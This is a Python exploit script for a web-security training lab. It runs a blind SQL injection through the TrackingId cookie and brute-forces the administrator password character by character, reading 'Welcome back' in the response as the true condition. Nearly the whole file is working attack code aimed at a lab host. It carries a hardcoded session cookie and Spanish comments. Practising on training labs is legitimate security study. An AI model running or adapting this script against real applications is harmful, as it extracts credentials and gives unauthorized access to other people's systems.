#!/usr/bin/env python3
# Lab: Blind SQL injection with conditional responses
# Goal: Brute-force the administrator password character by character

from pwn import *
import requests
import signal
import string
import sys

# Manejo de cierre ordenado (Ctrl+C)
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Configuración del entorno
characters = string.ascii_lowercase + string.digits 
target_url = "https://0afd00540433ac10815c1df5003a00c5.web-security-academy.net"
p1 = log.progress("SQLI")
p1.status("Iniciando ataque de fuerza bruta")

def makeSQLI():
    password = ""
    p2 = log.progress("Password")

    # Iteramos sobre la longitud estimada de la contraseña (1-20)
    for position in range(1, 21):
        for character in characters: 
            # Inyección en la cookie TrackingId usando SUBSTRING para comparar caracteres
            cookies = {
                'TrackingId': f"xyz' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}'--",
                'session': "xkwHU4bggBmEx0ijIEHAYx0fgb60eemG"
            }

            p1.status(f"Probando posición {position} con carácter: {character}")
            r = requests.get(target_url, cookies=cookies)

            # Si la condición es verdadera, el servidor responde con "Welcome back"
            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()
